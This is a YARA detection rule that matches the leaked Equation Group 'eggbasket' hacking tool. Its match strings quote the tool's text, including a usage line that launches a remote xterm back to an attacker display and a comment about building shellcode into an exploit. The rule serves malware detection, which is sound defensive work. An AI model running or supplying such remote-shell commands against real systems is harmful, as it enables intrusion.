rule EquationGroup_eggbasket {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file eggbasket"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "b078a02963610475217682e6e1d6ae0b30935273ed98743e47cc2553fbfd068f"
      id = "3fb1388a-e6b8-5c7a-ad23-ddbfc9d33d56"
   strings:
      $x1 = "# Building Shellcode into exploit." fullword ascii
      $x2 = "%s -w /index.html -v 3.5 -t 10 -c \"/usr/openwin/bin/xterm -d 555.1.2.2:0&\"  -d 10.0.0.1 -p 80" fullword ascii
      $x3 = "# STARTING EXHAUSTIVE ATTACK AGAINST " fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 90KB and 1 of them ) or ( 2 of them )
}